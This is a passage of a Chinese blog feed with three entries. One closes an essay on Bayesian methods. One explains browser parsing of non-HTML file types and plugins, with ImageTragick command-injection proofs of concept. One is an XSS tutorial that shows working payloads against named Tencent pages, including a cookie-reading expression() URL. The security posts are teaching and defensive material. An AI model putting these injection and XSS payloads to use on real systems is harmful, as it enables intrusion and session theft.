<p><strong>一点注记：</strong>这里，为什么有这个数据稀疏问题，还是因为统计学习方法工作在浅层面，世界上的单词就算不再变多也是非常之多的，单词之间组成的句子也是变化多端，更不用说一篇文章了，文章数目则是无穷的，所以在这个层面作统计，肯定要被数据稀疏性困扰。我们要注意，虽然句子和文章的数目是无限的，然而就拿邮件来说，如果我们只关心邮件中句子的语义（进而更高抽象层面的“意图”（语义，意图如何可计算地定义出来是一个人工智能问题），在这个层面上可能性便大大缩减了，我们关心的抽象层面越高，可能性越小。单词集合和句子的对应是多对一的，句子和语义的对应又是多对一的，语义和意图的对应还是多对一的，这是个层级体系。神经科学的发现也表明大脑的皮层大致有一种层级结构，对应着越来越抽象的各个层面，至于如何具体实现一个可放在计算机内的大脑皮层，仍然是一个未解决问题，以上只是一个原则（principle）上的认识，只有当 computational 的 cortex 模型被建立起来了之后才可能将其放入电脑。</p>
<h2 id="5-2_为什么朴素贝叶斯方法令人诧异地好——一个理论解释">5.2 为什么朴素贝叶斯方法令人诧异地好——一个理论解释</h2>
<p>朴素贝叶斯方法的条件独立假设看上去很傻很天真，为什么结果却很好很强大呢？就拿一个句子来说，我们怎么能鲁莽地声称其中任意一个单词出现的概率只受到它前面的 3 个或 4 个单词的影响呢？别说 3 个，有时候一个单词的概率受到上一句话的影响都是绝对可能的。那么为什么这个假设在实际中的表现却不比决策树差呢？有人对此提出了一个理论解释，并且建立了什么时候朴素贝叶斯的效果能够等价于非朴素贝叶斯的充要条件，这个解释的核心就是：有些独立假设在各个分类之间的分布都是均匀的所以对于似然的相对大小不产生影响；即便不是如此，也有很大的可能性各个独立假设所产生的消极影响或积极影响互相抵消，最终导致结果受到的影响不大。具体的数学公式请参考这篇 paper 。</p>
<h1 id="6-_层级贝叶斯模型">6. 层级贝叶斯模型</h1>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626304175931.jpg" alt=""></p>
<p>层级贝叶斯模型是现代贝叶斯方法的标志性建筑之一。前面讲的贝叶斯，都是在同一个事物层次上的各个因素之间进行统计推理，然而层次贝叶斯模型在哲学上更深入了一层，将这些因素背后的因素（原因的原因，原因的原因，以此类推）囊括进来。一个教科书例子是：如果你手头有 N 枚硬币，它们是同一个工厂铸出来的，你把每一枚硬币掷出一个结果，然后基于这 N 个结果对这 N 个硬币的 θ （出现正面的比例）进行推理。如果根据最大似然，每个硬币的 θ 不是 1 就是 0 （这个前面提到过的），然而我们又知道每个硬币的 p(θ) 是有一个先验概率的，也许是一个 beta 分布。也就是说，每个硬币的实际投掷结果 Xi 服从以 θ 为中心的正态分布，而 θ 又服从另一个以 Ψ 为中心的 beta 分布。层层因果关系就体现出来了。进而 Ψ 还可能依赖于因果链上更上层的因素，以此类推。</p>
<h2 id="6-1_隐马可夫模型（HMM）">6.1 隐马可夫模型（HMM）</h2>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626304453370.jpg" alt=""></p>
<p>吴军在数学之美系列里面介绍的隐马可夫模型（HMM）就是一个简单的层级贝叶斯模型：</p>
<p>那么怎么根据接收到的信息来推测说话者想表达的意思呢？我们可以利用叫做“隐含马尔可夫模型”（Hidden Markov Model）来解决这些问题。以语音识别为例，当我们观测到语音信号 o1,o2,o3 时，我们要根据这组信号推测出发送的句子 s1,s2,s3。显然，我们应该在所有可能的句子中找最有可能性的一个。用数学语言来描述，就是在已知 o1,o2,o3,…的情况下，求使得条件概率 P (s1,s2,s3,…|o1,o2,o3….) 达到最大值的那个句子 s1,s2,s3,…</p>
<p>吴军的文章中这里省掉没说的是，s1, s2, s3, .. 这个句子的生成概率同时又取决于一组参数，这组参数决定了 s1, s2, s3, .. 这个马可夫链的先验生成概率。如果我们将这组参数记为 λ ，我们实际上要求的是：P(S|O, λ) （其中 O 表示 o1,o2,o3,.. ，S表示 s1,s2,s3,..）</p>
<p>当然，上面的概率不容易直接求出，于是我们可以间接地计算它。利用贝叶斯公式并且省掉一个常数项，可以把上述公式等价变换成</p>
<p>P(o1,o2,o3,…|s1,s2,s3….) * P(s1,s2,s3,…)</p>
<p>其中</p>
<p>P(o1,o2,o3,…|s1,s2,s3….) 表示某句话 s1,s2,s3…被读成 o1,o2,o3,…的可能性, 而 P(s1,s2,s3,…) 表示字串 s1,s2,s3,…本身能够成为一个合乎情理的句子的可能性，所以这个公式的意义是用发送信号为 s1,s2,s3…这个数列的可能性乘以 s1,s2,s3.. 本身可以一个句子的可能性，得出概率。</p>
<p>这里，s1,s2,s3…本身可以一个句子的可能性其实就取决于参数 λ ，也就是语言模型。所以简而言之就是发出的语音信号取决于背后实际想发出的句子，而背后实际想发出的句子本身的独立先验概率又取决于语言模型。</p>
<h1 id="7-_贝叶斯网络">7. 贝叶斯网络</h1>
<p>吴军已经对贝叶斯网络作了科普，请直接跳转到<a href="http://googlechinablog.com/2007/01/bayesian-networks.html" target="_blank" rel="external">这里</a>。更详细的理论参考所有机器学习的书上都有。</p>
<p>参考资料</p>
<p>一堆机器学习，一堆概率统计，一堆 Google ，和一堆 Wikipedia 条目，一堆 paper 。</p>
<p>部分书籍参考《机器学习与人工智能资源导引》。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="平凡而又神奇的贝叶斯方法">平凡而又神奇的贝叶斯方法</h1>
<p>偶然又看到有人推荐刘未鹏《暗时间》这篇文章，几年前看这文章的时候，没接触机器学习，对其感触不是很深，就觉得对贝叶斯解释的非常到位。现在有一些数据挖掘基础之后，再看一遍，还是感觉收获巨大，把很多地]]>
    </summary>
    
      <category term="machine learning" scheme="http://yoursite.com/tags/machine-learning/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[非HTML类型文档的复仇以及插件 -- 《The Tangled Web》]]></title>
    <link href="http://yoursite.com/2016/05/07/%E9%9D%9EHTML%E7%B1%BB%E5%9E%8B%E6%96%87%E6%A1%A3%E7%9A%84%E5%A4%8D%E4%BB%87%E4%BB%A5%E5%8F%8A%E6%8F%92%E4%BB%B6-%E3%80%8AThe-Tangled-Web%E3%80%8B/"/>
    <id>http://yoursite.com/2016/05/07/非HTML类型文档的复仇以及插件-《The-Tangled-Web》/</id>
    <published>2016-05-07T09:29:03.000Z</published>
    <updated>2016-05-07T09:29:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="非HTML类型文档的复仇以及插件">非HTML类型文档的复仇以及插件</h1>
<p>除了HTML文档，浏览器还可以识别其他若干的文件格式，而这些文件格式，在大多数情况风险比较低，但是在某些时候，会冒出致命的危险，接下来会说的一个最近刚刚曝出的漏洞。</p>
<h2 id="纯文本文件">纯文本文件</h2>
<p>Content-Type: text/plain</p>
<p>除了IE，收到没有头域的HTTP/0.9 或者缺少Content-Type 的响应，默认是处理为纯文本文件，而IE会处理为HTML 文件。同时，大多数浏览器，对若干的MIME 类型，及其各种变种，text/CSS 都映射为纯文本文件，是为了方便开发人员，当然，JSON除外。</p>
<h2 id="位图图片">位图图片</h2>
<p>在缺少Content-Type 响应头的情况下，会有解析器去检测文档的头部信息，来判断类型。如果包含了Content-Type类型，那么先匹配到MIME 类型，如果无法解析，就会再检测文档头部信息，来确定类型。</p>
<p>而近期曝出的ImageMagick 的0day 漏洞，就是这样一个漏洞，漏洞发生在这款ImageMagick 的图像处理软件，它被广泛用来在网站上进行图像处理，其原理就是，用户上传图像，每个图像会有一个magic bytes，实际上就是文件头，用来表示图像类型，ImageMagick 的功能就是通过解析器，对文件头进行解析，然后进一步处理。</p>
<p>如果我们把一个含有恶意代码的文件保存为文件格式，交给ImageMagick 解析，正常是ImageMagick 无法解析的，当然漏洞就是不正常的时候了，参考如下代码：</p>
<figure class="highlight javaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line"></div><div class="line">viewbox <span class="number">0</span> <span class="number">0</span> <span class="number">640</span> <span class="number">480</span></div><div class="line"></div><div class="line">fill ‘url(https:<span class="comment">//example.com/image.jpg“|ls “-la)’</span></div><div class="line"></div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>

<p>将其保存为jpg 格式等，调用ImageMagick 去处理它，就会触发一个最常见的查看本地文件的漏洞，下面在说一下原因。</p>
<p>ImageMagick 在 MagickCore/constitute.c 的 ReadImage 函数中解析图片，如果图片地址是 https:// 开头的，即调用 InvokeDelegate。MagickCore/delegate.c 定义了委托。作为一个执行命令被引入的，但是，对参数的引入没有做好足够的过滤，造成了渗透的可能，比如一个默认命令是为了处理来自http 请求送来的：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"wget"</span> -q -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></div></pre></td></tr></table></figure>

<p>此处的%M 是真实的输入参数，如果他的值是这样的:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`https://example.com<span class="string">";|ls "</span>-la`</div></pre></td></tr></table></figure>

<p>很显然，由于引号的奇怪闭合方式，这一块恰好满足了bash 的语法，通过一个通道符，我们继续调用了ls -la ，显然，这就引起了注入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ convert <span class="string">'https://example.com";|ls "-la'</span> out.png</div><div class="line">total <span class="number">32</span></div><div class="line">drwxr-xr-x <span class="number">6</span> user group <span class="number">204</span> Apr <span class="number">29</span> <span class="number">23</span>:<span class="number">08</span> .</div><div class="line">drwxr-xr-x+ <span class="number">232</span> user group <span class="number">7888</span> Apr <span class="number">30</span> <span class="number">10</span>:<span class="number">37</span> ..</div></pre></td></tr></table></figure>

<p>这是基本的原因，实际上的利用漏洞过程通过上传文件，构造exploit, 上文中已经构造了一个文件，他的格式是按照mvg 格式，对于ImageMigick 存在这种漏洞的有两个格式，mvg,和svg,mvg 相对好构造一点。</p>
<p>更进一步的，通过构造exploit ，我们可以删除服务器文件，移动服务器文件，或者是读取服务器文件，其结果，你懂得。</p>
<p>具体参见这个漏洞专门成立的网站<a href="https://imagetragick.com/" target="_blank" rel="external">Imagetragick</a>, 如今在乌云上，借着这个漏洞，已经提交了无数个0day 漏洞了。</p>
<h2 id="音视频文件">音视频文件</h2>
<p>其细节内容，不做过多的深究，对于其安全隐患，也就是是否合理的消除类型错判带来的风险，和上边的图片处理有一点点相似。</p>
<p>另外，作者想了一个很有想象力的情况，如果<audio> 支持未压缩的原生音频播放，然后这个标签被指向了敏感的非音频文件，但是由于是处在这个标签下，还是会被当做原生的音频播放，虽然是混乱的声波。而在HTML5 之下，调用麦克风API，可以捕捉这些声波信息，通过这些声波信息，又重组了文件内容。OTZ…</audio></p>
<h2 id="XML_文件">XML 文件</h2>
<p>浏览器会根据收到的Content-Type 或一些其他线索，为集中特殊的XML 格式提供单一用途的XML 解析器。而绝大部分时候，和XHTML 同一个解析器。在XML 中，</p>
<ul>
<li>文档的实际含义取决于XML 文件中的xmlns 命名空间</li>
<li>xmlns 和 Content-Type 的值无关，按后者进行解析</li>
<li>可能有多个xmlns,对文档的每个段落赋予不同的含义</li>
</ul>
<h4 id="常规的XML_视图">常规的XML 视图</h4>
<p>如果没有能够识别的命名空间设定，那么浏览器会默认显示一种树状结构，如果有的话，就按照实际含义进行显示。</p>
<p>但由于这种需要显示未知用途和无法识别命名空间的XML 文档，会带来一定的容错，这种容错，可能导致XSS，比如代理未经过滤的RSS 订阅源，一般来说是有特定的解析器进行处理，但如果没有内置RSS 阅读功能的浏览器，可能会使用最常规的解析模式，而RSS 订阅源中可能存在有HTML 代码，造成XSS 漏洞。</p>
<h4 id="可缩放向量图片">可缩放向量图片</h4>
<p>这里所说的一般是SVG，在上一部分的那个例子里，已经探讨过SVG带来的灾难，一个常见的svg 表达方式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">xmlns</span>=<span class="value">"http://www.w3.org/2000/svg"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">&lt;![CDATA[</span></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">clicked</span><span class="params">()</span> </span>{alert(<span class="string">"hello"</span>);}</div><div class="line">]]&gt;<span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">circle</span> <span class="attribute">onclick</span>=<span class="value">"clicked()"</span> <span class="attribute">cx</span>=<span class="value">"50"</span> <span class="attribute">cy</span>=<span class="value">"50"</span> <span class="attribute">r</span>=<span class="value">"50"</span> <span class="attribute">fill</span>=<span class="value">"pink"</span> /&gt;</span><span class="tag">&lt;/<span class="title">svg</span>&gt;</span></div></pre></td></tr></table></figure>


<p>目前该特性已被绝大多数浏览器支持，这里的svg是完成了一个划出圆圈，同时在圆圈中点击会显示提示信息。</p>
<p>对于svg来说，这种格式的图片可以直接放在独立的XML 文档中被访问到，同时也可以放在第三方页面上用&lt; img&gt;引用到，而使用img的话，svg的脚本部分会被完全禁止掉，但是虽然会被禁止，但是还是有危险的，他所在的内置脚本仍然有可能获得图片所在域名的上下文环境权限并且执行，所以如果引入外部来源的svg,就一定要做好非常严谨的语法过滤，上文提到的ImageMagick 漏洞，就是因为在处理图片头的时候，没有做好过滤造成的。</p>
<p>除此之外，还有一些其他类型的文档，比如<strong>数学标记语言</strong>， <strong>XML用户界面语言</strong>， <strong>无线标记语言</strong>，<strong>RSS Atom订阅源</strong> 等等。</p>
<p>另外，还有一些不可显示的文件类型，如插件和扩展的安装清单列表，manifests,自动HTTP代理配置歘繁忙PAC，可安装的外观样式，整数撤销列表CRL，反恶意网站黑名单等等。</p>
<h3 id="安全工程">安全工程</h3>
<p>当需要处理的数据很可能被解析为XHTML 格式，或其他支持脚本的文档类型，不要只去根据Content-Type 响应头和最顶层的xmlns 指令来判断。同时不要再任意位置上允许出现可由用户控制的标记语言。</p>
<p>如果不需要直接访问该文件，可以在响应的响应头加上<strong>Content-Disposition:Attachment</strong>。</p>
<p>对于非HTML 类型文档，正确识别Content-Type响应头，同时正确设置字符集编码，也很重要。</p>
<h1 id="浏览器插件">浏览器插件</h1>
<p>浏览器插件林林总总，形态各异。简单来讲，一个常见的插件，是讲在浏览器中显示一种新型的文件格式，格式类似于HTML，浏览器得到后交给插件进行处理。</p>
<p>很容易可以想到，浏览器插件的安全漏洞，不仅多，而且千奇百怪，可以说针对Web 应用程序的攻击，与插件占有关系占了很大一部分。</p>
<p>对插件的调用通过几个显式的形式调用：</p>
<ul>
<li>标记 &lt; object data=…&gt; 这样的形式，或者是&lt; embed src=…&gt;.</li>
<li>type 参数，将type的参数的MIME 与浏览器里注册的有效插件的MIME类型做一个对比，如果匹配，就把它传给谍影的插件如理，如果没有匹配，理论上会出现窗口，提示用户下载，但某些时候，浏览器会根据Content-Type头域，或者URL 里文件后缀的方式猜测。</li>
<li>插件里的输入信息一般通过&lt; object&gt; 区块里嵌入&lt; param&gt; 标签来进行设置。</li>
</ul>
<p>这里我们要强调的是，在对插件Content-Type 处理时是存在风险的，若干插件实际上有自己完整的代码执行环境，而且这些可执行的应用在于他们所在源站点进行交互时拥有一系列的特权，就很容易出现CSRF 的跨站漏洞。比如已经被启用的&lt; applet&gt;标签，可用于加载java 小程序。GIFAR 漏洞在2008年诞生，就是用一个applet 中加载的java程序，偷偷的隐藏在一个GIF 图片中。</p>
<p><strong>插件的各种应用框架</strong></p>
<p>这其中藏着无数的坑待挖掘，这里只是个小引子~</p>
<ul>
<li>Flash ,不多说，如今越来越不受待见其中存在有严重的脚本注入等问题，如getURL() navigateToURL() 控制浏览器打开访问新窗口等等，他还拥有一些特殊技能，这些特殊技能都有着致命的危险：<ul>
<li>收集字体等系统识别特征</li>
<li>可以全屏，所以可以制作UI 欺诈</li>
<li>能得到麦克风和摄像头的数据</li>
<li>能忽略浏览器的安全和隐私设定，使用自己的安全设置进行数据持久化</li>
<li>默认情况下，可以直接使用浏览器的HTTP 堆栈及其管理的全局身份凭证信息。</li>
<li>可以和其他运行的Flash 交互</li>
<li>访问应用页的DOM 元素</li>
<li>FLash 自带内部简化版HTML 解析器，转义等等问题要注意</li>
<li>插件自身的设计问题等等等等等等等等等等</li>
</ul>
</li>
<li>Microsoft Sliverlight ,不懂，有机会接触的时候再详细理解吧。</li>
<li>Sun java,&lt; applet&gt; 已经因为严重的问题被抛弃了。</li>
<li>XML Browser Applications ，微软家的不怎么懂，同上上。</li>
<li>ActiveX Controls ,一度很火，如今几乎挂了，不过IE8之前，你懂得，黑客的天堂。</li>
</ul>
<h2 id="安全工程-1">安全工程</h2>
<p>提供需要让插件处理的文件时：</p>
<ul>
<li>对于来源信任的数据，还是应当避免处理用户提供的URL，也不要在小程序中产生或者试图修改用户控制的HTML。</li>
<li>对于用户控制的简单的多媒体，记得要验证文件格式，甚至是限制文件格式，使用正确的Content-Type 设置，同时要吸取各种前车之鉴，避免内容检测造成的漏洞。</li>
<li>用户控制的文档格式，虽然本质上是可以绝对安全，但是插件仍然有漏洞的可能，所以对于文档，两个解决办法，专用域名，单词有效的令牌，不要持久cookie.</li>
</ul>
<p>对于需要嵌入由插件处理的文件，无外乎就是确保type 参数明确，如果无法被识别的话，一定要做出各种限制，任何非信任站点来的东西，都不要随便接收，做好对设置的核查。</p>
<p>开发ActiveX 组件？放弃吧！</p>
<hr>
<p>由于对浏览器插件这一块不熟，而且感觉这里边有一些有趣的文章可以做，但作者又讲的很少，而且大多数是一些行将就木的过时插件的东西，所以这里我就简短的写了写。</p>
<p>至此，所有关于Web 的东西基本上结束了，回顾整个过程，我们会发现，在Web 中，存在的漏洞一方面是由于本身在协议阶段就存在不科学的地方，另一方面在浏览器等客户端在实现过程中，又由于各自为战，也存在有不统一和各自的缺陷存在，还有一个原因，就是开发者自己在开发中，并不懂自己写出来的代码会带来什么样的困扰，这大概是最可怕的，同时，由于客户端的真正操作者是对程序对代码一窍不通的人，在安全风险上，完全不能依赖他们去提供一点点的阻挡。</p>
<p>所以，一个真正想要构建安全环境的产品，是需要一个团队在整个流程里，能准确把握所有可能造成安全问题的隐患，用最稳妥的方式处理。渗透不可怕，可怕的是每次只有当渗透发生了之后，仅仅明白哪里出错，而不知道为什么会出错，为什么会被黑客抓住。</p>
<p>所以，真正的安全者，是对自己的产品每一块防护措施都了如指掌的人。 </p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="非HTML类型文档的复仇以及插件">非HTML类型文档的复仇以及插件</h1>
<p>除了HTML文档，浏览器还可以识别其他若干的文件格式，而这些文件格式，在大多数情况风险比较低，但是在某些时候，会冒出致命的危险，接下来会说的一个最近刚刚曝出的漏洞。</p>
<h]]>
    </summary>
    
      <category term="TCP/IP" scheme="http://yoursite.com/tags/TCP-IP/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 3) HTML中的野怪 -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/06/-level-3-HTML%E4%B8%AD%E7%9A%84%E9%87%8E%E6%80%AA-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/06/-level-3-HTML中的野怪-XSS升级之路/</id>
    <published>2016-05-06T03:25:54.000Z</published>
    <updated>2016-05-06T03:27:14.000Z</updated>
    <content type="html"><![CDATA[<h1 id="level_3_HTML_中的野怪">level 3 HTML 中的野怪</h1>
<p>当然XSS 的漏洞不仅仅只出现在script 代码块中，还可以包含在丰富的HTML 的标签属性中。比如img,input 等一系列标签，基本格式是 &lt; HTML标签 onXXXX=”在这里” &gt; 或者是放在伪URL 里，比如&lt; a href = “javascript:在这里”&gt; xxxx 。</p>
<p>一般这样地方的参数，很少是直接通过输入就直接放进去的，不过有时候常常是接受了用户的输入，最后输出的时候，会出现在这些位置，但如果对用户的输入没有做详尽的处理和过滤的话，就会出现明显的XSS 漏洞。来个栗子：</p>
<p>比如某网站是这样的：</p>
<p><a href="http://example.com/search.php?word=helloworld" target="_blank" rel="external">http://example.com/search.php?word=helloworld</a></p>
<p>对应在HTML 代码中，他出现在了这样的区域里：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">"helloworld"</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>开发者没有对helloworld进行过滤的话，我们直接构造</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">word=helloworld<span class="string">" onclick="</span>alert(<span class="regexp">/xss/</span>)</div></pre></td></tr></table></figure>

<p>然后在对引号括号等，使用URL 编码，直接变成如下结构：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">helloworld%22+onclick%3d%22alert(%2fxss%2f)</div></pre></td></tr></table></figure>

<p>也就完成了xss过程，不过这种漏洞现在已经非常稀少，因为它太容易过滤了，只需要将双引号过滤即可，一般做法就是将双引号过滤成HTML 实体编码，也就是&#quot; 对于HTML 解析器，它能够识别在文本节点和参数值里边的实体编码，并且在内存中创建文档树的表现形式时，透明的对这些编码进行解码。所以，在创建DOM 树结构的时候，&amp;quot(有个分号，但是markdown会直接转了); 还没有被解码成引号，而且创建文档树的内容的时，才会考虑解码，而这时，其XSS 功效已经不能发挥作用了。</p>
<p>于是，对于有过滤规则的情况下，该标签将变成：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">"helloworld&quot; onclick=&quot;alert(1)"</span> /&gt;</span></div></pre></td></tr></table></figure>

<p>但是，仅仅是这样的过滤，显然是不够用的，还有其他的注入点可以进，继续在乌云上来看腾讯的例子，考虑这样一个网址：<br><a href="http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=FFFFFF&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx" target="_blank" rel="external">http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=FFFFFF&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</a></p>
<p>我们查看输出的HTML 源码，发现bg 那里对应的是background-color,我们尝试那里用不同的字符尝试，观察其过滤情况。在这里，我让bg = “\&lt;&gt;() 就是希望观察一下它的过滤情况，基本上所有的字符都被过滤了，但是只有\ 没有被过滤<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-06-14625007746187.jpg" alt=""></p>
<p>如何只用 \ 构造利用语句呢，我们可以想到CSS 中的字符编码，CSS 提供了一套转义处理策略，一个反斜杠后边跟1~6位十六进制数字。然后利用CSS 的expression 来调用JavaScript 代码。也就是试图构造出</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">expression(eval(alert(/xss/))</div></pre></td></tr></table></figure>

<p>这样的代码，完整来说，就是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">body</span> <span class="attribute">style</span>=<span class="value">"... background-color:;width:expression(eval(alert(/xss/)))"</span>&gt;</span></div></pre></td></tr></table></figure>

<p>用分号来结束backgroud-color,然后 w: 后边跟上expression,如果expression 要被过滤，那就加上转义，把expression 随意变下形就可以，于是，在下边这样的代码构造下，漏洞又被利用了。</p>
<p><a href="http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx" target="_blank" rel="external">http://follow.v.t.qq.com/index.php?c=follow&amp;a=index&amp;appkey=801004516&amp;bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29&amp;hsize=80&amp;name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx</a></p>
<p>不过很遗憾的，expression 当年是微软搞出来的技术，但是一直没被其他浏览器接受，同时，甚至微软自己如今也抛弃了这种特性，它出现在IE6，IE7，和IE8的一些早期版本，因为微软官方也认为该属性不具有通用性，而且它处理的事务，如今已经能够在CSS 中正常的完成，如min-width,max-width， 这些都已经在IE8之后得到很好的支持，所以expression 也只能在这两个古老版本上起效。</p>
<p>那么，继续考虑一些别的情况，考虑下面这个网站：<br><a href="http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa" target="_blank" rel="external">http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa</a></p>
<p>其输出的HTML 代码中，我们可以找到它：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-06-14625022573118.jpg" alt=""></p>
<p>对于放在javascript: 中的伪URL，其效果和放在script 代码块中没有区别。在这里 aaaaaa我们可以考虑对其做点什么，很自然的，我们想到用单引号闭合，然后后边加上alert(/xss/) 这样的构造，看起来比较绕，其构造步骤是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">location.href=<span class="string">'...&searchvalue=aaaaaa'</span></div><div class="line">location.href=<span class="string">'...&searchvalue=aaaa'</span>+alert(<span class="number">1</span>)+<span class="string">''</span></div><div class="line">location.href=<span class="string">'...&searchvalue=aaaa&#x27;+alert(1)+&#x27;'</span></div></pre></td></tr></table></figure>

<p>如果单引号，被过滤，就要改成HTML 编码，这样，就能在源代码中javascript 伪URL那里添加了alert(1) 这样的XSS。这步骤改造完毕之后，我们将可能被过滤的&amp;-&gt; %26,#-&gt;%23 转换成URL 编码，构造成这样的URL：<br><a href="http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27" target="_blank" rel="external">http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27</a>;</p>
<p>至此，又完成了一次XSS 注入，但到此处，是否有一个疑问呢，还是关于编码解析的问题。在上一个栗子中，我们说，将双引号，改成&amp;quot ; 这样的形式，就不会出现异常的解析了，但是这里，我们主动的将单引号改成了&amp;#27 ; 这样的形式，反而成功的完成了XSS 呢。</p>
<p>其实，这是一个解析顺序的原因，正常的解析顺序是这样的，先对URL解码，那些用URL 编码的字符都变成解码后的参数传出去，然后是HTML 解析，HTML 解析，此时 ，是先构建DOM文档结构，然后才会对每一个文本节点，属性值内容进行解析，这时候，HTML 实体编码的部分，才会还原回来，这个时候已经不会对DOM 结构造成影响了。然后是JS 解析，此时才会执行JS 代码的内容。而此时，HTML 已经完成了解码。</p>
<p>对应上边的栗子，在JS 解析之前，HTML 已经对那些编码完成了解码，对于JS 来说，一切都写的清清楚楚的了。</p>
<p>回到那个栗子，我们利用的代码，原样是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">id</span>=<span class="value">"pagenum"</span>  <span class="attribute">class</span>=<span class="value">"inputstyle0814"</span>  <span class="attribute">onkeydown</span>=<span class="value">"if ((event.keyCode==13) && (this.value!='')) location.href='http://stock.finance.qq.com/report/search.php?offset='+this.value+'&searchtype_yjbg=yjjg&searchvalue_yjbg=aaaaaaaaaa'"</span>/&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></div></pre></td></tr></table></figure>

